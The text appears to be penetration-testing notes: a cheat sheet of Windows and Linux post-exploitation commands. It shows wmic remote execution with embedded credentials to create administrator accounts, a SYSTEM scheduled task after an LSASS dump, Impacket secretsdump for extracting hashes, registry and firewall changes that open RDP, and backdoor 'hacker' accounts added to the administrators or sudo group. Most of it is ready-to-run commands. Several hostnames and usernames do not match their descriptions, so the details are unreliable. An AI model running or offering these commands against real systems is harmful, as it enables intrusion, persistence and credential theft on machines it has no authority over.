#### 1. **Remote Command Execution Using `wmic`**

- **Objective**: Execute commands remotely to create a new local user and add them to the Administrators group.
- **Command**:
    ```bash
    wmic /node:"V.apples-globalx.com" /user:"apples-globalx.com\I01" /password:"W<Redacted>0" process call create "cmd.exe /c net user apples <Redacted> && net localgroup administrators sapples /add"
    ```
    - **Description**: This command remotely connects to the machine `DGSUWV.ABCDglb.com` using `wmic`. It creates a new user `napples` with a specified password, then adds this user to the `Administrators` group.

#### 2. **Post-Exploitation: Task Scheduling and Secrets Dump**

- **After LSASS Dump**: 
  - **Create a Scheduled Task**:
    ```bash
    schtasks /S SGG.applesB.COM /create /sc minute /mo 10 /tn "penapples task" /tr C:\Migration\jconsole.exe /ru "SYSTEM"
    ```
    - **Description**: This command schedules a task ned "penapples task" on the remote system `SG.applesB.COM` to run every 10 minutes. The task executes `jconsole.exe` under the `SYSTEM` account.

  - **Delete the Scheduled Task**:
    ```bash
    schtasks /S S.apples-globalx.COM /delete /tn "penapples task" /f
    ```
    - **Description**: This command deletes the previously created scheduled task "penapples task" on the remote system `SG.ABCDGLB.COM`.

- **Secrets Dump**:
    - **Decrypt and Extract Hashes**: Use `secretsdump.py` from the Impacket suite to decrypt the dumped credentials from LSASS.

#### 3. **Enable Remote Desktop Protocol (RDP) on Windows**

- **Enable RDP via Registry**:
    ```bash
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    ```
    - **Note**: This command may not be necessary depending on the system configuration.

- **Enable RDP through Firewall**:
    ```bash
    netsh firewall set service remoteadmin enable 
    netsh firewall set service remotedesktop enable
    ```
    - **Description**: These commands enable the `Remote Admin` and `Remote Desktop` services through the Windows Firewall.

#### 4. **Adding Users**

- **Windows**:
  1. **Create a New User**:
      ```bash
      net user hacker hacker93 /add
      ```
      - **Description**: Creates a new user ned `hacker` with the password `hacker93`.

  2. **Add User to Administrators Group**:
      ```bash
      net localgroup administrators hacker /add
      ```
      - **Description**: Adds the `hacker` user to the `Administrators` group.

- **Linux**:
  - **View Groups**:
      ```bash
      cat /etc/group
      ```
  - **Create a New User**:
      ```bash
      adduser hacker
      ```
      - **Alternative**:
        ```bash
        /usr/sbin/adduser hacker
        ```
  - **Set Password for the User**:
      ```bash
      passwd hacker
      ```
  - **Add User to a Group**:
      ```bash
      useradd -G {group-ne} hacker
      ```
  - **Add User to `sudo` Group**:
      ```bash
      /usr/sbin/usermod -aG sudo hacker
      ```
      - **Description**: Adds the `hacker` user to the `sudo` group, granting administrative privileges.
